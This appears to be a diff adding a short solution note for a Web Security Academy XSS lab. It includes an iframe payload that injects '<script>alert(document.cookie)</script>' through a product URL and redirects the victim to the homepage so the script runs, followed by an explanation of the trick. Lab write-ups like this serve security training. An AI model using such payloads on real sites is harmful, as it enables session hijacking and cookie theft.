@@ -1,0 +1,10 @@
+// View script in product page
+// View last viewed product <a> tag in home page
+
+<iframe src="https://ac551f081e37abef801620e8004b00c5.web-security-academy.net/product?productId=1&'><script>alert(document.cookie)</script>" onload="if(!window.x)this.src='https://ac551f081e37abef801620e8004b00c5.web-security-academy.net';window.x=1;"> 
+
+	“src=…”: In this way, we can inject our XSS into window.location, since a new window object is created for each <iframe>.
+	“onload=…”: When victim visits our site and <iframe> is loaded, the window.x variable is not set, victim will be directed back to homepage after document.cookie is set with our payload.
+	Visiting homepage will execute our XSS payload.
+	x is just a normal variable chosen. It is being set after direction happens once, so user will not be redirected again next time when visiting attacker site.
+
